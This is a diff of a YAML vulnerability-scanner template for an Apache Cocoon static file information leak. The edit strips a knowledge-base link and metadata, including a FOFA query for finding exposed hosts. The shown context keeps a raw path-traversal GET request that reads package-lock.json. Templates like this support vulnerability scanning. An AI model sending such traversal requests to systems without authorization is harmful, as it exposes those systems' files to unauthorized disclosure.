@@ -3,12 +3,8 @@ info:
   name: Apache Cocoon 存在静态文件信息泄露漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/sd43zx50uzk68wm0'
+  description: ''
   tags: info-leak,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: sd43zx50uzk68wm0
-    fofa: app="apache-cocoon"
 http:
 - raw:
   - 'GET /xmlui/themes/Mirage2/images/UCrea/pc/../../../package-lock.json HTTP/1.1
